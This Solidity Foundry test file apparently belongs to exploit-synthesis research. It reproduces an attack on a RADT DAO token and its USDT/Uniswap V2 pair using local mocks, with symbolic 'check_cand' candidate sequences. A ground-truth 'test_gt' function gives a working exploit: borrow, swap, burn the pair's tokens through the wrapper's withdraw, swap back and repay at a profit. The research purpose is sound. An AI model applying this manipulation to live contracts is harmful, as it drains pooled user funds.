// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {RADTDAO} from "./RADTDAO.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {Wrapper} from "./Wrapper.sol";

contract RADTDAOTest is Test, BlockLoader {
    RADTDAO radt;
    USDT usdt;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    Wrapper wrapper;
    AttackContract attackContract;
    address owner;
    address attacker;
    address radtAddr;
    address usdtAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address wrapperAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1663905800;
    uint112 reserve0pair = 94453473060895791601540;
    uint112 reserve1pair = 8163658010724952139310;
    uint32 blockTimestampLastpair = 1663905794;
    uint256 kLastpair = 771084437533614376388993871504910532570047377;
    uint256 price0CumulativeLastpair = 1221402894907148026766298229634119016688;
    uint256 price1CumulativeLastpair =
        171626870517834744593910101969779780246953;
    uint256 totalSupplyusdt = 4979997922170098408283526080;
    uint256 balanceOfusdtpair = 94453473060895791601540;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtwrapper = 0;
    uint256 totalSupplyradt = 999999000000000000000000;
    uint256 balanceOfradtpair = 8163658010724952139310;
    uint256 balanceOfradtattacker = 0;
    uint256 balanceOfradtwrapper = 0;

    function setUp() public {
        owner = address(this);
        radt = new RADTDAO();
        radtAddr = address(radt);
        usdt = new USDT();
        usdtAddr = address(usdt);
        pair = new UniswapV2Pair(
            address(usdt),
            address(radt),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        wrapper = new Wrapper(address(radt));
        wrapperAddr = address(wrapper);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(pair), balanceOfusdtpair);
        radt.transfer(address(pair), balanceOfradtpair);
        radt.afterDeploy(address(pair), address(wrapper));
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Radt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(radt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(radt),
            address(radt),
            radt.decimals()
        );
        emit log_string("");
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(radt),
            address(usdt),
            radt.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(radt),
            address(pair),
            radt.decimals()
        );
        emit log_string("");
        emit log_string("Wrapper Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(wrapper),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(radt),
            address(wrapper),
            radt.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(radt),
            address(attacker),
            radt.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_radt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        radt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_radt_owner(uint256 amount) internal eurus {
        radt.transfer(owner, amount);
    }

    function borrow_usdt_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_pair(uint256 amount) internal eurus {
        usdt.transfer(address(pair), amount);
    }

    function borrow_radt_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        radt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_radt_pair(uint256 amount) internal eurus {
        radt.transfer(address(pair), amount);
    }

    function swap_pair_attacker_usdt_radt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_radt_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        radt.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function burn_radt_pair(uint256 amount) internal eurus {
        wrapper.withdraw(address(owner), address(pair), amount);
        pair.sync();
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_radt(amt1, amt2);
        swap_pair_attacker_radt_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_usdt_owner(amt0);
        burn_radt_pair(amt1);
        swap_pair_attacker_usdt_radt(amt2, amt3);
        swap_pair_attacker_radt_usdt(amt4, amt5);
        payback_usdt_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_radt(amt1, amt2);
        burn_radt_pair(amt3);
        swap_pair_attacker_radt_usdt(amt4, amt5);
        payback_usdt_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_radt_owner(amt0);
        swap_pair_attacker_radt_usdt(amt1, amt2);
        swap_pair_attacker_usdt_radt(amt3, amt4);
        payback_radt_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_radt_owner(amt0);
        burn_radt_pair(amt1);
        swap_pair_attacker_radt_usdt(amt2, amt3);
        swap_pair_attacker_usdt_radt(amt4, amt5);
        payback_radt_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_radt_owner(amt0);
        swap_pair_attacker_radt_usdt(amt1, amt2);
        burn_radt_pair(amt3);
        swap_pair_attacker_usdt_radt(amt4, amt5);
        payback_radt_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_radt(amt1, amt2);
        swap_pair_attacker_radt_usdt(amt3, amt4);
        swap_pair_attacker_usdt_radt(amt5, amt6);
        swap_pair_attacker_radt_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        burn_radt_pair(amt1);
        swap_pair_attacker_usdt_radt(amt2, amt3);
        swap_pair_attacker_radt_usdt(amt4, amt5);
        swap_pair_attacker_usdt_radt(amt6, amt7);
        swap_pair_attacker_radt_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_radt(amt1, amt2);
        burn_radt_pair(amt3);
        swap_pair_attacker_radt_usdt(amt4, amt5);
        swap_pair_attacker_usdt_radt(amt6, amt7);
        swap_pair_attacker_radt_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_radt(amt1, amt2);
        swap_pair_attacker_radt_usdt(amt3, amt4);
        burn_radt_pair(amt5);
        swap_pair_attacker_usdt_radt(amt6, amt7);
        swap_pair_attacker_radt_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_radt(amt1, amt2);
        swap_pair_attacker_radt_usdt(amt3, amt4);
        swap_pair_attacker_usdt_radt(amt5, amt6);
        burn_radt_pair(amt7);
        swap_pair_attacker_radt_usdt(amt8, amt9);
        payback_usdt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_radt_owner(amt0);
        swap_pair_attacker_radt_usdt(amt1, amt2);
        swap_pair_attacker_usdt_radt(amt3, amt4);
        swap_pair_attacker_radt_usdt(amt5, amt6);
        swap_pair_attacker_usdt_radt(amt7, amt8);
        payback_radt_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_radt_owner(amt0);
        burn_radt_pair(amt1);
        swap_pair_attacker_radt_usdt(amt2, amt3);
        swap_pair_attacker_usdt_radt(amt4, amt5);
        swap_pair_attacker_radt_usdt(amt6, amt7);
        swap_pair_attacker_usdt_radt(amt8, amt9);
        payback_radt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_radt_owner(amt0);
        swap_pair_attacker_radt_usdt(amt1, amt2);
        burn_radt_pair(amt3);
        swap_pair_attacker_usdt_radt(amt4, amt5);
        swap_pair_attacker_radt_usdt(amt6, amt7);
        swap_pair_attacker_usdt_radt(amt8, amt9);
        payback_radt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_radt_owner(amt0);
        swap_pair_attacker_radt_usdt(amt1, amt2);
        swap_pair_attacker_usdt_radt(amt3, amt4);
        burn_radt_pair(amt5);
        swap_pair_attacker_radt_usdt(amt6, amt7);
        swap_pair_attacker_usdt_radt(amt8, amt9);
        payback_radt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt10 >= amt0);
        borrow_radt_owner(amt0);
        swap_pair_attacker_radt_usdt(amt1, amt2);
        swap_pair_attacker_usdt_radt(amt3, amt4);
        swap_pair_attacker_radt_usdt(amt5, amt6);
        burn_radt_pair(amt7);
        swap_pair_attacker_usdt_radt(amt8, amt9);
        payback_radt_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        borrow_usdt_owner(1000e18);
        printBalance("After step0 ");
        swap_pair_attacker_usdt_radt(
            usdt.balanceOf(attacker),
            pair.getAmountOut(usdt.balanceOf(attacker), address(usdt))
        );
        printBalance("After step1 ");
        burn_radt_pair((radt.balanceOf(address(pair)) * 100) / 9);
        printBalance("After step2 ");
        swap_pair_attacker_radt_usdt(
            radt.balanceOf(attacker),
            pair.getAmountOut(radt.balanceOf(attacker), address(radt))
        );
        printBalance("After step3 ");
        payback_usdt_owner((1000e18 * 1003) / 1000);
        printBalance("After step4 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt6 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_radt(amt1, amt2);
        burn_radt_pair(amt3);
        swap_pair_attacker_radt_usdt(amt4, amt5);
        payback_usdt_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }
}
